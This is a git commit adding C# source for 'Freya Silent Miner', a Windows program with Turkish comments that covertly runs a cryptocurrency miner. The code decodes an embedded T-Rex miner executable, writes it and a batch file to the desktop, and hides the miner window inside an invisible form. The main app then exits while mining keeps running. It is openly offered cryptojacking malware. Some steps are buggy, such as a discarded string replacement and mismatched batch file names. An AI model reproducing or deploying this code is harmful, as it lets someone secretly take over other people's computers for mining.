c73032b87056b2b6ab33e2f65f2e5768a42b66f6
Atalayagiz <78467521+Atalayagiz@users.noreply.github.com>
2022-06-01 19:03:46 +0300

    Add files via upload

---
+++ Freya Silent Miner/Freya Silent Miner/Form1.Designer.cs
@@ -0,0 +1,64 @@
+﻿
+namespace Freya_Silent_Miner
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///Gerekli tasarımcı değişkeni.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///Kullanılan tüm kaynakları temizleyin.
+        /// </summary>
+        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer üretilen kod
+
+        /// <summary>
+        /// Tasarımcı desteği için gerekli metot - bu metodun 
+        ///içeriğini kod düzenleyici ile değiştirmeyin.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.SuspendLayout();
+            // 
+            // panel1
+            // 
+            this.panel1.Location = new System.Drawing.Point(12, 12);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(50, 44);
+            this.panel1.TabIndex = 0;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(75, 74);
+            this.Controls.Add(this.panel1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Name = "Form1";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel panel1;
+    }
+}
+
---
+++ Freya Silent Miner/Freya Silent Miner/Form1.cs
@@ -0,0 +1,62 @@
+﻿using Freya_Silent_Miner.Properties;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Freya_Silent_Miner
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        [DllImport("user32.dll")]
+        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+
+            //Burada asıl miner'ı masaüstüne kopyalamak için byte'ını okuyoruz.
+            byte[] bytes = Convert.FromBase64String(Resources.trex);
+
+            //Burada masaüstüne droplayacağımız için öncelikle dosyayı oluşturup, daha sonra kopyaladığımız byte'ı yazıyoruz.
+            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\t-rex.exe").Dispose();
+            File.WriteAllBytes(@"C:\Users\" + Environment.UserName + @"\Desktop\t-rex.exe", bytes);
+
+            //Buraya kendi binance borsasından aldığınız ETC adresini gireceksiniz.
+            string ETCADDRESS = "Enter your ethereumclassic address here.";
+
+            //Burada miningi başlatmak için gereken bat'ın yazılarını okuduk.
+            string bat = Resources.BAT;
+
+            //Burada kendi ETC adresimi sizinkiyle değiştirdim ki benim hesabım için mining yapmasın.
+            bat.Replace("0xf245a9debe5e9aa77a2e3ce9b68d188e5b777e9a", ETCADDRESS);
+
+            //Burada da tekrar masaüstüne bat dosyası oluşturup içerisine yazıları yazdırdık.
+            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\2minersetcminer.bat").Dispose();
+            File.WriteAllText(@"C:\Users\" + Environment.UserName + @"\Desktop\2minersetcminer.bat", bat);
+
+            //Burada da mining'i silent hale dönüştüren kısım başlıyor. Form görünmez olmasına rağmen miner form'un içerisinde ki panelde çalıştığı için görünmez oluyor.
+            Process p = Process.Start(@"C:\Users\" + Environment.UserName + @"\Desktop\ETC-2miners.bat");
+            Thread.Sleep(500); // Allow the process to open it's window
+            SetParent(p.MainWindowHandle, panel1.Handle);
+
+            //Burada main uygulamadan çıkış yapıyoruz ancak mining hala devam ediyor.
+            Application.Exit();
+
+        }
+    }
+}
